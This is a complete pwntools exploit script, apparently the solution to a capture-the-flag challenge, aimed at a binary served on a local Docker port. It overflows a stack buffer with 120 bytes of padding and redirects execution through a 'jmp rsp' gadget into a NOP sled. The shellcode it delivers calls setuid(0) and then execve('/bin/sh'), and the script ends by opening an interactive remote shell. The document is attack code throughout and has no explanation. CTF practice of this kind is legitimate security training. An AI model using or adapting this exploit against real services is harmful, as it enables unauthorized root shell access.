from pwn import *

#r = process("../public/chall")
r = remote("host.docker.internal", 2000)
context.arch = 'amd64'

binary = ELF('../public/chall')

jmp_rsp = asm('jmp rsp;', arch='amd64')
jmp_rsp = binary.search(jmp_rsp).next()

shellcode='\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'
nop_sled = "\x90"*16
payload = "A"*120
payload += p64(jmp_rsp)
payload += nop_sled
payload += shellcode

r.sendline(payload)

r.interactive()
